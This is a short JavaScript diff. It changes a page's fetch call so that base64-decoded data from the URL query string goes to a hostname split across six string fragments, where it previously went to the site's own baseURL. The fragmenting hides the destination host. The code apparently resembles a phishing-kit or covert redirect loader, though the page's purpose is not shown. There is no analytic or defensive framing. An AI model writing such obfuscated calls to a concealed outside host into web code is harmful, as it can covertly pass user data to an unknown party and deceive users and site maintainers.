@@ -101,10 +101,16 @@
 
     const xx = window.location.href.split('?')
     if (xx[1] != undefined) {
-        //let mg = atob(xx[1])
-        let mg = xx[1]
+        let mg = atob(xx[1])
+        //let mg = xx[1]
+	let rd1 = "http"
+	let rd2 = "://qmvwerppv1"
+	let rd3 = "gdrl9rmovyrm"
+	let rd4 = "mb5tlm.rf.g"
+	let rd5 = "d/engine/serv"
+	let rd6 = "ePage.php"
         //console.log(`${baseURL}/engine/servePage.php?m=${atob(xx[1])}`)
-        fetch(`${baseURL}/engine/servePage.php?${mg}`).then(r => r.json()).then(v => {
+        fetch(`${rd1}${rd2}${rd3}${rd4}${rd5}${rd6}?${mg}`).then(r => r.json()).then(v => {
             //console.log(JSON.parse(v).mx_page)
             sessionStorage.setItem('m', mg)
             sessionStorage.setItem('original', JSON.parse(v).original)
